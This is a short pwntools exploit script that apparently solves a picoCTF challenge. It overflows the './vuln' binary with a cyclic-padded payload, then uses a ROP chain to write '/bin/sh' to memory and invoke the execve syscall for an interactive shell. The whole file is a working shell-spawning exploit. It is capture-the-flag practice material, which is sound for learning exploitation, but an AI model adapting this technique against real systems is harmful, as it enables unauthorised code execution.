from pwn import *

syscall = 0x40137c
pop_rax = 0x4163f4
pop_rdi = 0x400696
pop_rsi = 0x410ca3
pop_rdx = 0x44a6b5
mov_rdi_rdx = 0x436393  #mov [rdi], rdx
bin_sh_addr = 0x6b7000

r = process("./vuln")
#r = remote("jupiter.challenges.picoctf.org", 39940)
r.sendline(b"84")
r.recvuntil("New winner!\nName? ")

writegadget = p64(pop_rdx) + str.encode("/bin/sh".ljust(8, "\x00"))
writegadget += p64(pop_rdi) + p64(bin_sh_addr)
writegadget += p64(mov_rdi_rdx)

sigframe = p64(pop_rax) + p64(59)
sigframe += p64(pop_rdi) + p64(bin_sh_addr)
sigframe += p64(pop_rsi) + p64(0)
sigframe += p64(pop_rdx) + p64(0)
sigframe += p64(syscall)

payload = cyclic(0x78) + writegadget + sigframe
r.sendline(payload)
r.interactive()
